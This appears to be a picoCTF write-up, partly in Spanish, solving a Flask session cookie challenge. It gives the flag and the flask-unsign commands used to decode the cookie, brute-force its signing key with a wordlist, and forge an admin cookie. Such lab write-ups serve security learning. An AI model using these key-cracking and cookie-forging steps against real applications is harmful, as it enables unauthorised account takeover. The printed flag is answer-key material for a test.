#### Description

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://wily-courier.picoctf.net:59953/

**Solución**

`picoCTF{cO0ki3s_yum_b8a89e75}`

**Notas Adicionales** 

**Instalación del Herramental:** Se utilizó `pip` para instalar `flask-unsign`, una herramienta diseñada para decodificar, crackear y firmar cookies de Flask.

·         **Comando:** `pip3 install flask-unsign --break-system-packages`

**Identificación y Decodificación:** Se obtuvo la cookie de sesión del navegador y se decodificó para observar su estructura en formato JSON.

·         **Comando:** `python3 -m flask_unsign --decode --cookie "ey..."`

·         **Contenido:** `{'very_auth': 'snickerdoodle'}`

**Ataque de Diccionario (Brute-force):** Se utilizó un archivo `wordlist.txt` con nombres de galletas extraídos del código fuente del servidor para realizar un ataque de fuerza bruta contra la firma de la cookie.

·         **Comando:** `python3 -m flask_unsign --unsign --cookie "ey..." --wordlist wordlist.txt`

·         **Resultado:** Se identificó que la `SECRET_KEY` válida era `'sugar'`.

**Falsificación de Identidad (Privilege Escalation):** Utilizando la clave descubierta, se generó una nueva firma para una cookie que cambia el valor de `very_auth` a `'admin'`.

·         **Comando:** `python3 -m flask_unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'sugar'`

**Inyección y Validación:** Al sustituir la cookie original por la forjada en el almacenamiento del navegador, el servidor validó la firma como legítima y otorgó acceso a la bandera del reto.

**Referencias**

